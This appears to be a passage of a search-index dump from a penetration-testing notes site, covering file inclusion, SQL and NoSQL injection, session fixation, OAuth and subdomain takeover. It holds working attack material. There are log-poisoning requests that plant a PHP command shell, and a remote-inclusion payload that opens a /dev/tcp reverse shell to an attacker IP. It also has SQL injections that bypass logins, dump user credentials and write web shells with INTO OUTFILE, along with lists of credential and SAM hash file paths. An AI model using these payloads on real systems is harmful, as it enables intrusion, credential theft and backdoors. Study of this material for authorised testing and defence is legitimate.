https://gist.github.com/sckalath/a8fd4e754a72015aa0b8 /etc/mtab /etc/inetd.conf /var/log/dmessage Web server files # Usually found in the root of the website .htaccess config.php SSH authorized_keys id_rsa id_rsa.keystore id_rsa.pub known_hosts Logs /etc/httpd/logs/acces_log /etc/httpd/logs/error_log /var/www/logs/access_log /var/www/logs/access.log /usr/local/apache/logs/access_ log /usr/local/apache/logs/access. log /var/log/apache/access_log /var/log/apache2/access_log /var/log/apache/access.log /var/log/apache2/access.log /var/log/access_log User specific files Found in the home-directory .bash_history .mysql_history .my.cnf Proc files \"Under Linux, /proc includes a directory for each running process, including kernel processes, in directories named /proc/PID, where PID is the process number. Each directory contains information about one process, including: /proc/PID/cmdline, the command that originally started the process.\" https://en.wikipedia.org/wiki/Procfs https://blog.netspi.com/directory-traversal-file-inclusion-proc-file-system/ /proc/sched_debug # Can be used to see what processes the machine is running /proc/mounts /proc/net/arp /proc/net/route /proc/net/tcp /proc/net/udp /proc/net/fib_trie /proc/version /proc/self/environ","title":"Sensitive file"},{"location":"attacking_web_applications/local_file_inclusion/#bruteforcing-ssh-known95hosts","text":"https://blog.rootshell.be/2010/11/03/bruteforcing-ssh-known_hosts-files/","title":"Bruteforcing SSH known_hosts"},{"location":"attacking_web_applications/local_file_inclusion/#lfi-to-shell","text":"Under the right circumstances you might be able to get a shell from a LFI","title":"LFI to shell"},{"location":"attacking_web_applications/local_file_inclusion/#log-poisoning","text":"There are some requirements. We need to be able to read log files. In this example we are going to poison the apache log file. You can use either the success.log or the error.log So once you have found a LFI vuln you have to inject php-code into the log file and then execute it. Insert php-code into the log file This can be done with nc or telnet. nc 192.168.1.102 80 GET /<?php passthru($_GET['cmd']); ?> HTTP/1.1 Host: 192.168.1.102 Connection: close You can also add it to the error-log by making a request to a page that doesn't exists nc 192.168.1.102 80 GET /AAAAAA<?php passthru($_GET['cmd']); ?> HTTP/1.1 Host: 192.168.1.102 Connection: close Or in the referer parameter. GET / HTTP/1.1 Referer: <? passthru($_GET[cmd]) ?> Host: 192.168.1.159 Connection: close Execute it in the browser Now you can request the log-file through the LFI and see the php-code get executed. http://192.168.1.102/index.php?page=../../../../../var/log/apache2/access.log&cmd=id","title":"Log poisoning"},{"location":"attacking_web_applications/local_file_inclusion/#proc-files","text":"If you can read the proc-files on the system you might be able to poison them through the user-agent. We can also inject code into /proc/self/environ through the user-agent https://www.exploit-db.com/papers/12992/ https://www.youtube.com/watch?v=ttTVNcPnsJY","title":"Proc files"},{"location":"attacking_web_applications/local_file_inclusion/#windows","text":"Fingerprinting c:\\WINDOWS\\system32\\eula.txt c:\\boot.ini c:\\WINDOWS\\win.ini c:\\WINNT\\win.ini c:\\WINDOWS\\Repair\\SAM c:\\WINDOWS\\php.ini c:\\WINNT\\php.ini c:\\Program Files\\Apache Group\\Apache\\conf\\httpd.conf c:\\Program Files\\Apache Group\\Apache2\\conf\\httpd.conf c:\\Program Files\\xampp\\apache\\conf\\httpd.conf c:\\php\\php.ini c:\\php5\\php.ini c:\\php4\\php.ini c:\\apache\\php\\php.ini c:\\xampp\\apache\\bin\\php.ini c:\\home2\\bin\\stable\\apache\\php.ini c:\\home\\bin\\stable\\apache\\php.ini Logs Common path for apache log files on windows: c:\\Program Files\\Apache Group\\Apache\\logs\\access.log c:\\Program Files\\Apache Group\\Apache\\logs\\error.log PHP Session Locations c:\\WINDOWS\\TEMP\\ c:\\php\\sessions\\ c:\\php5\\sessions\\ c:\\php4\\sessions\\ Retrieving password hashes In order to retrieve the systems password hashed we need two files: system and SAM . Once you have those two files you can extract the hased using the kali tool pwdump, like this: pwdump systemfile samfile The system and SAM files can be found in different locations, so try them all. From a webserver the path might be case-sensitive, even though it is windows. So consider that! Systemroot is usually windows windows\\repair\\SAM %SYSTEMROOT%\\repair\\SAM %SYSTEMROOT%\\System32\\config\\RegBack\\SAM %SYSTEMROOT%\\System32\\config\\SAM %SYSTEMROOT%\\repair\\system %SYSTEMROOT%\\System32\\config\\SYSTEM %SYSTEMROOT%\\System32\\config\\RegBack\\system","title":"Windows"},{"location":"attacking_web_applications/local_file_inclusion/#references","text":"This is the definitive guide to Local File inclusion https://highon.coffee/blog/lfi-cheat-sheet/ And this http://securityidiots.com/Web-Pentest/LFI And this: https://websec.wordpress.com/2010/02/22/exploiting-php-file-inclusion-overview/ https://nets.ec/File_Inclusion https://gist.github.com/sckalath/da1a232f362a700ab459","title":"References:"},{"location":"attacking_web_applications/nosql-injections/","text":"Nosql-injections # Nosql-databases like MongoDB is becoming more and more common. So this needs to be expanded. Login bypass # Basically change the query to this. {\"user\":{\"$gt\": \"\"},\"pass\":{\"$gt\": \"\"}} http://blog.websecurify.com/2014/08/hacking-nodejs-and-mongodb.html http://blog.websecurify.com/2014/08/attacks-nodejs-and-mongodb-part-to.html","title":"NoSQL Injection"},{"location":"attacking_web_applications/nosql-injections/#nosql-injections","text":"Nosql-databases like MongoDB is becoming more and more common. So this needs to be expanded.","title":"Nosql-injections"},{"location":"attacking_web_applications/nosql-injections/#login-bypass","text":"Basically change the query to this. {\"user\":{\"$gt\": \"\"},\"pass\":{\"$gt\": \"\"}} http://blog.websecurify.com/2014/08/hacking-nodejs-and-mongodb.html http://blog.websecurify.com/2014/08/attacks-nodejs-and-mongodb-part-to.html","title":"Login bypass"},{"location":"attacking_web_applications/oauth_attacks/","text":"OAuth stands for Open Authorization. It should probably be called OAuthz to remind people that OAuth should be used for authorization and not authentication. It is generally used as a mechanism to delegate authorization. An end user can allow a party access to its data which is stored at another party. The problem that OAuth tries to solve, in a nutshell, is this: a user wants to share its data between two applications. The crazy stupid one to do this would simply be to give his/her password to the application that he/she wants to share data with. And the application can simply log in and retreive the data. This would of course be crazy, because everyone would have to share their creds to a lot of applications. So how can we share data between applications without sharing the users credentials? Let's create some better terminology for this: 1. Resource owner (RO) - usually the enduser. 2. Client - The application that wants access to the Resources owners resources. 3. Authorization server - The server that asks the RO for access on behalf of the client. 4. Resource Server - Server that stores the ROs data. It is common that the Authorization server and the resource server is the same actor. Facebook, Google, Github. In OAuth terminology one talks about different grant_types. There are four different grant_types: 1. Authorization code 2. Implicit 3. Resource owner password credentials - This is the problem that I previously wrote that OAuth tries to solve. 4. Client credentials Authroization code - Code Flow # Let's walk through the grant type Authorization code. This is usually called Code Flow. It is the most complex form, but probably also the most secure. It is divided into two parts: Authorization flow and Token Flow. OAuth Flow Authorization flow - runs in the browser 1. User enters Client website/app. 2. User is redirected to Authorize endpoint of OAuth server. 3. OAuth Server redirect user to Authentication Server, since the user is not authenticated. 4. User authenticats at Authentication server, and is redirected back to OAuth server. 5. OAuth server issues a one-time token (Authorization Code) Token Flow - Runs on the backend 6. The Client post a request to the /token endpoint with the Authorization code and the client credentials (Client ID and Client Secret). 7. The Auth Server returns a access token and a refresh token. Common attacks # Token / Code stealing # CSRF - Missing State param # Token impersonation #","title":"OAuth Attacks"},{"location":"attacking_web_applications/oauth_attacks/#authroization-code-code-flow","text":"Let's walk through the grant type Authorization code. This is usually called Code Flow. It is the most complex form, but probably also the most secure. It is divided into two parts: Authorization flow and Token Flow. OAuth Flow Authorization flow - runs in the browser 1. User enters Client website/app. 2. User is redirected to Authorize endpoint of OAuth server. 3. OAuth Server redirect user to Authentication Server, since the user is not authenticated. 4. User authenticats at Authentication server, and is redirected back to OAuth server. 5. OAuth server issues a one-time token (Authorization Code) Token Flow - Runs on the backend 6. The Client post a request to the /token endpoint with the Authorization code and the client credentials (Client ID and Client Secret). 7. The Auth Server returns a access token and a refresh token.","title":"Authroization code - Code Flow"},{"location":"attacking_web_applications/oauth_attacks/#common-attacks","text":"","title":"Common attacks"},{"location":"attacking_web_applications/oauth_attacks/#token-code-stealing","text":"","title":"Token / Code stealing"},{"location":"attacking_web_applications/oauth_attacks/#csrf-missing-state-param","text":"","title":"CSRF - Missing State param"},{"location":"attacking_web_applications/oauth_attacks/#token-impersonation","text":"","title":"Token impersonation"},{"location":"attacking_web_applications/remote_file_inclusion/","text":"Remote File Inclusion # Remote file inclusion uses pretty much the same vector as local file inclusion. A remote file inclusion vulnerability lets the attacker execute a script on the target-machine even though it is not even hosted on that machine. RFI's are less common than LFI. Because in order to get them to work the developer must have edited the php.ini configuration file. This is how they work. So you have an unsanitized parameter, like this $incfile = $_REQUEST[\"file\"]; include($incfile.\".php\"); Now what you can do is to include a file that is not hosted on the victim-server, but instead on the attackers server. http://exampe.com/index.php?page=http://attackerserver.com/evil.txt And evil.txt will look like something like this: <?php echo shell_exec(\"whoami\");?> # Or just get a reverse shell directly like this: <?php echo system(\"0<&196;exec 196<>/dev/tcp/10.11.0.191/443; sh <&196 >&196 2>&196\"); ?> So when the victim-server includes this file it will automatically execute the commands that are in the evil.txt file. And we have a RCE. Avoid extentions # Remember to add the nullbyte %00 to avoid appending .php . This will only work on php before version 5.3. If it does not work you can also add a ? , this way the rest will be interpreted as url parameters.","title":"Remote File Inclusion"},{"location":"attacking_web_applications/remote_file_inclusion/#remote-file-inclusion","text":"Remote file inclusion uses pretty much the same vector as local file inclusion. A remote file inclusion vulnerability lets the attacker execute a script on the target-machine even though it is not even hosted on that machine. RFI's are less common than LFI. Because in order to get them to work the developer must have edited the php.ini configuration file. This is how they work. So you have an unsanitized parameter, like this $incfile = $_REQUEST[\"file\"]; include($incfile.\".php\"); Now what you can do is to include a file that is not hosted on the victim-server, but instead on the attackers server. http://exampe.com/index.php?page=http://attackerserver.com/evil.txt And evil.txt will look like something like this: <?php echo shell_exec(\"whoami\");?> # Or just get a reverse shell directly like this: <?php echo system(\"0<&196;exec 196<>/dev/tcp/10.11.0.191/443; sh <&196 >&196 2>&196\"); ?> So when the victim-server includes this file it will automatically execute the commands that are in the evil.txt file. And we have a RCE.","title":"Remote File Inclusion"},{"location":"attacking_web_applications/remote_file_inclusion/#avoid-extentions","text":"Remember to add the nullbyte %00 to avoid appending .php . This will only work on php before version 5.3. If it does not work you can also add a ? , this way the rest will be interpreted as url parameters.","title":"Avoid extentions"},{"location":"attacking_web_applications/session-fixation/","text":"Session Fixation # Session fixation is a pretty small but common vulnerability. A common way to handle the fact that HTTP is a stateless protocol is you store cookies in the users browser, and then have that cookie send to the web server on each subsequent request. This way the web server can know that the user has visited the website before. So when a user logs in to a web application a cookie for that session is usually created, in order for the web-server to know that the session is active. Session fixation happens when the session-identifier (in this case the cookie) is setbefore the user has authenticated itself (which is usually done with a simple username/password login), and then not changed when the user authenticates itself. For example, let's say you want to log in to a web application. When you first visit the site the following cookie is set: SessionID=123ad76dab97b23ba8d76a You then authenticate with your username and password and make a successful login. But the SessionID-cookie does not change. Then you have a session fixation vulnerability on your hands. Because this means that if an attacker can set the SessionID-cookie to a value the attacker knows it will then know the SessionID-cookie once the user actually authenticates. How to set the cookie? # In GET request - if the session-token is sent in the URL of a GET-request the attacker can simply send a link which contains the attacker-controlled session-token. XSS - If the attacker has also found a XSS vulnerability she can use it to set the cookie. This can of course be mitigated by setting the HttpOnly attribute to the cookie. META-tag - If the attacker has the ability to inject html-code she can use the META-tag to set the cookie. http://website.kon/<meta http-equiv=Set-Cookie content=\u201dsessionid=abcd\u201d> MITM - By being MITM the attacker can set the cookie.","title":"Session Fixation"},{"location":"attacking_web_applications/session-fixation/#session-fixation","text":"Session fixation is a pretty small but common vulnerability. A common way to handle the fact that HTTP is a stateless protocol is you store cookies in the users browser, and then have that cookie send to the web server on each subsequent request. This way the web server can know that the user has visited the website before. So when a user logs in to a web application a cookie for that session is usually created, in order for the web-server to know that the session is active. Session fixation happens when the session-identifier (in this case the cookie) is setbefore the user has authenticated itself (which is usually done with a simple username/password login), and then not changed when the user authenticates itself. For example, let's say you want to log in to a web application. When you first visit the site the following cookie is set: SessionID=123ad76dab97b23ba8d76a You then authenticate with your username and password and make a successful login. But the SessionID-cookie does not change. Then you have a session fixation vulnerability on your hands. Because this means that if an attacker can set the SessionID-cookie to a value the attacker knows it will then know the SessionID-cookie once the user actually authenticates.","title":"Session Fixation"},{"location":"attacking_web_applications/session-fixation/#how-to-set-the-cookie","text":"In GET request - if the session-token is sent in the URL of a GET-request the attacker can simply send a link which contains the attacker-controlled session-token. XSS - If the attacker has also found a XSS vulnerability she can use it to set the cookie. This can of course be mitigated by setting the HttpOnly attribute to the cookie. META-tag - If the attacker has the ability to inject html-code she can use the META-tag to set the cookie. http://website.kon/<meta http-equiv=Set-Cookie content=\u201dsessionid=abcd\u201d> MITM - By being MITM the attacker can set the cookie.","title":"How to set the cookie?"},{"location":"attacking_web_applications/sql-injections/","text":"SQL-injections # Tldr # # Post ./sqlmap.py -r request.txt -p username # Get sqlmap -u \"http://192.168.1.101/index.php?id=1\" --dbms=mysql # Crawl sqlmap -u http://192.168.1.101 --dbms=mysql --crawl=3 How does sql-injections work? # So we have a website that is written in php. We have a login functionality, where the code looks like this: mysql_connect(\"localhost\", \"pelle\", \"mySecretPassowrd\") or die(mysql_error()); mysql_select_db(\"myHomepage\"); if ($_POST['uname'] != \"\"){ $username = $_POST['username']; $password = $_POST['password']; $query = \"SELECT * FROM users WHERE username = '$username' AND password='$password'\"; $result = mysql_query($query); $row = mysql_fetch_array($result); } So the user input is not filtered or sanitized in any way. Which means that what the users puts in in the login-form will be executed my mysql. So just like in xss-injections we just try to escape the input field to be able to execute sql-commands. So if we input the following into the user-field and password-field in the login: whatever' or '1'='1 whatever' or '1'='1 The query will look like this: $query = \"SELECT * FROM users WHERE username = 'whatever' OR '1'='1' AND password='whatever' OR '1'='1'\"; Since they both become true the database will retrieve all users and we will be able to bypass the login. If you know the username you could of course use that and then only inject on the password parameter. $query = \"SELECT * FROM users WHERE username = 'admin' AND password='whatever' OR '1'='1'\"; SQLmap # Sqlmap is a great tool to perform sql-injections. Here is the manual. https://github.com/sqlmapproject/sqlmap/wiki/Usage Using sqlmap with login-page # So you need to authenticate before you can access the vulnerable paramter. You just cature the request using burp suite, and save the requiest in a file. Then your run sqlmap -r request.txt Since the cookie is saved in the reuqest sqlmap can do it. Crawl a page to find sql-injections # sqlmap -u http://example.com --crawl=1 Dumping a database or table # Here we are dumping the database Webapp and the table Users. sqlmap -r request.txt -p username --dbms=mysql --dump -D Webapp -T Users Use proxy # --proxy=\"http://192.2.2.2.2:1111\" Proxy credencials --proxy-cred=\"username:password\" Login bypass # This is the most classic, standard first test: ' or '1'='1 Then you have: -' ' ' '&' '^' '*' ' or ''-' ' or '' ' ' or ''&' ' or ''^' ' or ''*' \"-\" \" \" \"&\" \"^\" \"*\" \" or \"\"-\" \" or \"\" \" \" or \"\"&\" \" or \"\"^\" \" or \"\"*\" or true-- \" or true-- ' or true-- \") or true-- ') or true-- ' or 'x'='x ') or ('x')=('x ')) or (('x'))=(('x \" or \"x\"=\"x \") or (\"x\")=(\"x \")) or ((\"x\"))=((\"x Sql-injections manually # Sqlmap is good, but it is not very stealthy. And it can generate a lot of traffic. And also it is good to understand the vulnerability in the cote and not just run tools. So let's learn sql-injections the manual way. The two main ways for perform a sql-injection: error based or blind . Error-bases DB enumeration # If we manage to find an error-message after a broken sql-query, we can use that to try to map out the database structure. For example, if we have a url that end with http://example.com/photoalbum.php?id=1 Step 1 - Add the tick ' # So first we should try to break the sql-syntaxt by adding a ' . We should first ad a ' or a \" . http://example.com/photoalbum.php?id=1' If the page then returns a blank page or a page with a sql-error we know that the page it vulnerable. Step 2 - Enumerate columns # So in order to enumerate the columns of a table we can use the order by Order by 1 means sort by values of the first column from the result set. Order by 2 means sort by values of the second column from the result set. So it is basically just a tool to order the data in a table. But we can use it to find out how many columns a table has. Because if we do order by 10 when there really only is 9 columns sql will throw an error. And we will know how many columns the table has. # This trhows no error http://example.com/photoalbum.php?id=1 order by 9 # This throws error http://example.com/photoalbum.php?id=1 order by 10 So you just increase the number (or do a binary tree search if you want tot do it a bit faster) until you get an error, and you know how many columns the table has. Step 3 - Find space to output db # Now we need to know which coolumns are being outputed on the webpage. It could be that not all data from the database is worthwhile to output, so maybe only column 1 and 3 are being outputted to the website. To find out which columns are being outputted we can use the union select command. So we do the command like this http://example.com/photoalbum.php?id=1 union select 1,2,3,4,5,6,7,8,9 For all the columns that exists. This will return the numbers of the columns that are being outputted on the website. Take note of which these columns are. Step 4 - Start enumerating the database # Now we can use that field to start outputing data. For example if columns number five has been visible in step 3, we can use that to output the data. Here is a list of data we can retrieve from the database. Some of the syntaxes may difference depending on the database engine (mysql, mssql, postgres). # Get username of the sql-user http://example.com/photoalbum.php?id=1 union select 1,2,3,4,user(),6,7,8,9 # Get version http://example.com/photoalbum.php?id=1 union select 1,2,3,4,version(),6,7,8,9 # Get all tables http://example.com/photoalbum.php?id=1 union select 1,2,3,4,table_name,6,7,8,9 from information_schema.tables # Get all columns from a specific table http://example.com/photoalbum.php?id=1 union select 1,2,3,4,column_name,6,7,8,9 from information_schema.columns where table_name = 'users' # Get content from the users-table. From columns name and password. The 0x3a only servers to create a delimitor between name and password http://example.com/photoalbum.php?id=1 union select 1,2,3,4,concat(name,0x3a, password),6,7,8,9 FROM users Blind sql-injection # We say that it is blind because we do not have access to the error log. This make the whole process a lot more complicated. But it is of course still possible to exploit. Using sleep # Since we do not have access to the logs we do not know if our commands are syntaxically correct or not. To know if it is correct or not we can however use the sleep statement. http://example.com/photoalbum.php?id=1-sleep(4) If it lods for four seconds exta we know that the database is processing our sleep() command. Get shell from sql-injection # The good part about mysql from a hacker-perspective is that you can actaully use slq to write files to the system. The will let us write a backdoor to the system that we can use. Load files # UNION SELECT 1, load_file(/etc/passwd) # http://example.com/photoalbum.php?id=1 union all select 1,2,3,4,\"<?php echo shell_exec($_GET['cmd']);?>\",6,7,8,9 into OUTFILE 'c:/xampp/htdocs/cmd.php' Write files # http://example.com/photoalbum.php?id=1 union all select 1,2,3,4,\"<?php echo shell_exec($_GET['cmd']);?>\",6,7,8,9 into OUTFILE 'c:/xampp/htdocs/cmd.php' http://example.com/photoalbum.php?id=1 union all select 1,2,3,4,\"<?php echo shell_exec($_GET['cmd']);?>\",6,7,8,9 into OUTFILE '/var/www/html/cmd.php' MSSQL - xp_cmdshell # You can run commands straight from the sql-query in MSSQL. Truncating Mysql Vulerability # Basically this happens when you don't validate the length of user input. Two things are needed for it to work: Mysql does not make comparisons in binary mode. This means that \"admin\" and \"admin \" are the same. If the username column in the database has a character-limit the rest of the characters are truncated, that is removed. So if the database has a column-limit of 20 characters and we input a string with 21 characters the last 1 character will be removed. With this information we can create a new admin-user and have our own password set to it. So if the max-length is 20 characters we can insert the following string admin removed This means that the \"removed\" part will be removed/truncated/deleted. And the trailing spaces will be removed upon insert in the database. So it will effectively be inserted as \"admin\". References # http://resources.infosecinstitute.com/sql-truncation-attack/ http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet http://resources.infosecinstitute.com/anatomy-of-an-attack-gaining-reverse-shell-from-sql-injection/","title":"SQL Injections"},{"location":"attacking_web_applications/sql-injections/#sql-injections","text":"","title":"SQL-injections"},{"location":"attacking_web_applications/sql-injections/#tldr","text":"# Post ./sqlmap.py -r request.txt -p username # Get sqlmap -u \"http://192.168.1.101/index.php?id=1\" --dbms=mysql # Crawl sqlmap -u http://192.168.1.101 --dbms=mysql --crawl=3","title":"Tldr"},{"location":"attacking_web_applications/sql-injections/#how-does-sql-injections-work","text":"So we have a website that is written in php. We have a login functionality, where the code looks like this: mysql_connect(\"localhost\", \"pelle\", \"mySecretPassowrd\") or die(mysql_error()); mysql_select_db(\"myHomepage\"); if ($_POST['uname'] != \"\"){ $username = $_POST['username']; $password = $_POST['password']; $query = \"SELECT * FROM users WHERE username = '$username' AND password='$password'\"; $result = mysql_query($query); $row = mysql_fetch_array($result); } So the user input is not filtered or sanitized in any way. Which means that what the users puts in in the login-form will be executed my mysql. So just like in xss-injections we just try to escape the input field to be able to execute sql-commands. So if we input the following into the user-field and password-field in the login: whatever' or '1'='1 whatever' or '1'='1 The query will look like this: $query = \"SELECT * FROM users WHERE username = 'whatever' OR '1'='1' AND password='whatever' OR '1'='1'\"; Since they both become true the database will retrieve all users and we will be able to bypass the login. If you know the username you could of course use that and then only inject on the password parameter. $query = \"SELECT * FROM users WHERE username = 'admin' AND password='whatever' OR '1'='1'\";","title":"How does sql-injections work?"},{"location":"attacking_web_applications/sql-injections/#sqlmap","text":"Sqlmap is a great tool to perform sql-injections. Here is the manual. https://github.com/sqlmapproject/sqlmap/wiki/Usage","title":"SQLmap"},{"location":"attacking_web_applications/sql-injections/#using-sqlmap-with-login-page","text":"So you need to authenticate before you can access the vulnerable paramter. You just cature the request using burp suite, and save the requiest in a file. Then your run sqlmap -r request.txt Since the cookie is saved in the reuqest sqlmap can do it.","title":"Using sqlmap with login-page"},{"location":"attacking_web_applications/sql-injections/#crawl-a-page-to-find-sql-injections","text":"sqlmap -u http://example.com --crawl=1","title":"Crawl a page to find sql-injections"},{"location":"attacking_web_applications/sql-injections/#dumping-a-database-or-table","text":"Here we are dumping the database Webapp and the table Users. sqlmap -r request.txt -p username --dbms=mysql --dump -D Webapp -T Users","title":"Dumping a database or table"},{"location":"attacking_web_applications/sql-injections/#use-proxy","text":"--proxy=\"http://192.2.2.2.2:1111\" Proxy credencials --proxy-cred=\"username:password\"","title":"Use proxy"},{"location":"attacking_web_applications/sql-injections/#login-bypass","text":"This is the most classic, standard first test: ' or '1'='1 Then you have: -' ' ' '&' '^' '*' ' or ''-' ' or '' ' ' or ''&' ' or ''^' ' or ''*' \"-\" \" \" \"&\" \"^\" \"*\" \" or \"\"-\" \" or \"\" \" \" or \"\"&\" \" or \"\"^\" \" or \"\"*\" or true-- \" or true-- ' or true-- \") or true-- ') or true-- ' or 'x'='x ') or ('x')=('x ')) or (('x'))=(('x \" or \"x\"=\"x \") or (\"x\")=(\"x \")) or ((\"x\"))=((\"x","title":"Login bypass"},{"location":"attacking_web_applications/sql-injections/#sql-injections-manually","text":"Sqlmap is good, but it is not very stealthy. And it can generate a lot of traffic. And also it is good to understand the vulnerability in the cote and not just run tools. So let's learn sql-injections the manual way. The two main ways for perform a sql-injection: error based or blind .","title":"Sql-injections manually"},{"location":"attacking_web_applications/sql-injections/#error-bases-db-enumeration","text":"If we manage to find an error-message after a broken sql-query, we can use that to try to map out the database structure. For example, if we have a url that end with http://example.com/photoalbum.php?id=1","title":"Error-bases DB enumeration"},{"location":"attacking_web_applications/sql-injections/#step-1-add-the-tick","text":"So first we should try to break the sql-syntaxt by adding a ' . We should first ad a ' or a \" . http://example.com/photoalbum.php?id=1' If the page then returns a blank page or a page with a sql-error we know that the page it vulnerable.","title":"Step 1 - Add the tick '"},{"location":"attacking_web_applications/sql-injections/#step-2-enumerate-columns","text":"So in order to enumerate the columns of a table we can use the order by Order by 1 means sort by values of the first column from the result set. Order by 2 means sort by values of the second column from the result set. So it is basically just a tool to order the data in a table. But we can use it to find out how many columns a table has. Because if we do order by 10 when there really only is 9 columns sql will throw an error. And we will know how many columns the table has. # This trhows no error http://example.com/photoalbum.php?id=1 order by 9 # This throws error http://example.com/photoalbum.php?id=1 order by 10 So you just increase the number (or do a binary tree search if you want tot do it a bit faster) until you get an error, and you know how many columns the table has.","title":"Step 2 - Enumerate columns"},{"location":"attacking_web_applications/sql-injections/#step-3-find-space-to-output-db","text":"Now we need to know which coolumns are being outputed on the webpage. It could be that not all data from the database is worthwhile to output, so maybe only column 1 and 3 are being outputted to the website. To find out which columns are being outputted we can use the union select command. So we do the command like this http://example.com/photoalbum.php?id=1 union select 1,2,3,4,5,6,7,8,9 For all the columns that exists. This will return the numbers of the columns that are being outputted on the website. Take note of which these columns are.","title":"Step 3 - Find space to output db"},{"location":"attacking_web_applications/sql-injections/#step-4-start-enumerating-the-database","text":"Now we can use that field to start outputing data. For example if columns number five has been visible in step 3, we can use that to output the data. Here is a list of data we can retrieve from the database. Some of the syntaxes may difference depending on the database engine (mysql, mssql, postgres). # Get username of the sql-user http://example.com/photoalbum.php?id=1 union select 1,2,3,4,user(),6,7,8,9 # Get version http://example.com/photoalbum.php?id=1 union select 1,2,3,4,version(),6,7,8,9 # Get all tables http://example.com/photoalbum.php?id=1 union select 1,2,3,4,table_name,6,7,8,9 from information_schema.tables # Get all columns from a specific table http://example.com/photoalbum.php?id=1 union select 1,2,3,4,column_name,6,7,8,9 from information_schema.columns where table_name = 'users' # Get content from the users-table. From columns name and password. The 0x3a only servers to create a delimitor between name and password http://example.com/photoalbum.php?id=1 union select 1,2,3,4,concat(name,0x3a, password),6,7,8,9 FROM users","title":"Step 4 - Start enumerating the database"},{"location":"attacking_web_applications/sql-injections/#blind-sql-injection","text":"We say that it is blind because we do not have access to the error log. This make the whole process a lot more complicated. But it is of course still possible to exploit.","title":"Blind sql-injection"},{"location":"attacking_web_applications/sql-injections/#using-sleep","text":"Since we do not have access to the logs we do not know if our commands are syntaxically correct or not. To know if it is correct or not we can however use the sleep statement. http://example.com/photoalbum.php?id=1-sleep(4) If it lods for four seconds exta we know that the database is processing our sleep() command.","title":"Using sleep"},{"location":"attacking_web_applications/sql-injections/#get-shell-from-sql-injection","text":"The good part about mysql from a hacker-perspective is that you can actaully use slq to write files to the system. The will let us write a backdoor to the system that we can use.","title":"Get shell from sql-injection"},{"location":"attacking_web_applications/sql-injections/#load-files","text":"UNION SELECT 1, load_file(/etc/passwd) # http://example.com/photoalbum.php?id=1 union all select 1,2,3,4,\"<?php echo shell_exec($_GET['cmd']);?>\",6,7,8,9 into OUTFILE 'c:/xampp/htdocs/cmd.php'","title":"Load files"},{"location":"attacking_web_applications/sql-injections/#write-files","text":"http://example.com/photoalbum.php?id=1 union all select 1,2,3,4,\"<?php echo shell_exec($_GET['cmd']);?>\",6,7,8,9 into OUTFILE 'c:/xampp/htdocs/cmd.php' http://example.com/photoalbum.php?id=1 union all select 1,2,3,4,\"<?php echo shell_exec($_GET['cmd']);?>\",6,7,8,9 into OUTFILE '/var/www/html/cmd.php'","title":"Write files"},{"location":"attacking_web_applications/sql-injections/#mssql-xp_cmdshell","text":"You can run commands straight from the sql-query in MSSQL.","title":"MSSQL - xp_cmdshell"},{"location":"attacking_web_applications/sql-injections/#truncating-mysql-vulerability","text":"Basically this happens when you don't validate the length of user input. Two things are needed for it to work: Mysql does not make comparisons in binary mode. This means that \"admin\" and \"admin \" are the same. If the username column in the database has a character-limit the rest of the characters are truncated, that is removed. So if the database has a column-limit of 20 characters and we input a string with 21 characters the last 1 character will be removed. With this information we can create a new admin-user and have our own password set to it. So if the max-length is 20 characters we can insert the following string admin removed This means that the \"removed\" part will be removed/truncated/deleted. And the trailing spaces will be removed upon insert in the database. So it will effectively be inserted as \"admin\".","title":"Truncating Mysql Vulerability"},{"location":"attacking_web_applications/sql-injections/#references","text":"http://resources.infosecinstitute.com/sql-truncation-attack/ http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet http://resources.infosecinstitute.com/anatomy-of-an-attack-gaining-reverse-shell-from-sql-injection/","title":"References"},{"location":"attacking_web_applications/static_analysis_of_javascript/","text":"When we get a javacript-heavy application we want to do a few different things. Increase the attack-surface - Find URL:s or domains Sensitive information - API-keys, passwords Potentially dangerous areas of code - eval, setDangerousInnerHTML Component with known vulnerabilities Luckily this can be done using static analysis. Step 1. Identify all javascript files # First navigate through the entire application manually while using burp. When you are done go to: Site map - select target - engagement tools - find scripts Step 2. Find URL:s # python linkfinder.py -i https://example.com -d -o cli Step 3. Find sensitive information # TruffleHog can find sensitive information. truffleHog","title":"Static Analysis of JavaScript"},{"location":"attacking_web_applications/static_analysis_of_javascript/#step-1-identify-all-javascript-files","text":"First navigate through the entire application manually while using burp. When you are done go to: Site map - select target - engagement tools - find scripts","title":"Step 1. Identify all javascript files"},{"location":"attacking_web_applications/static_analysis_of_javascript/#step-2-find-urls","text":"python linkfinder.py -i https://example.com -d -o cli","title":"Step 2. Find URL:s"},{"location":"attacking_web_applications/static_analysis_of_javascript/#step-3-find-sensitive-information","text":"TruffleHog can find sensitive information. truffleHog","title":"Step 3. Find sensitive information"},{"location":"attacking_web_applications/subdomain_takeover/","text":"Subdomain Takeover # This is a really cool attack. First you looks for all subdomains. Sometimes a company has forgotten about a subdomain. Like and old support system called support.example.com . And then the support-system that points to that domain gets removed. That means that we could start a service for support, and like it to that domain. And thereby controlling the domain. HackerOne reports https://hackerone.com/reports/114134 https://hackerone.com/reports/109699 https://blog.getwhitehats.com/being-a-developer-can-be-a-stressful-job-following-the-request-of-your-employer-creating-website-e96af56e51c3#.t3tqd5s0n http://yassineaboukir.com/blog/neglected-dns-records-exploited-to-takeover-subdomains/ https://labs.detectify.com/2014/10/21/hostile-subdomain-takeover-using-herokugithubdesk-more/","title":"Subdomain Takerovers"},{"location":"attacking_web_applications/subdomain_takeover/#subdomain-takeover","text":"This is a really cool attack. First you looks for all subdomains. Sometimes a company has forgotten about a subdomain. Like and old support system called support.example.com . And then the support-system that points to that domain gets removed. That means that we could start a service for support, and like it to that domain. And thereby controlling the domain. HackerOne reports https://hackerone.com/reports/114134 https://hackerone.com/reports/109699 https://blog.getwhitehats.com/being-a-developer-can-be-a-stressful-job-following-the-request-of-your-employer-creating-website-e96af56e51c3#.t3tqd5s0n http://yassineaboukir.com/blog/neglected-dns-records-exploited-to-takeover-subdomains/ https://labs.detectify.com/2014/10/21/hostile-subdomain-takeover-using-herokugithubdesk-more/","title":"Subdomain Takeover"},{"location":"attacking_web_applications/web-scanning/","text":"Find hidden files and directories # TLDR # # Dirb dirb https://192.168.1.101 # Gobuster - remove relevant responde codes (403 for example) gobuster -u http://192.168.1.101 -w /usr/share/seclists/Discovery/Web_Content/common.txt -s '200,204,301,302,307,403,500' -e About # There is essentially no way for a user to know which files are found in which directories on a web-server, unless the whole server has directory listing by default. However, if you go directly to the page it will be shown. So what the attacker can do is to brute 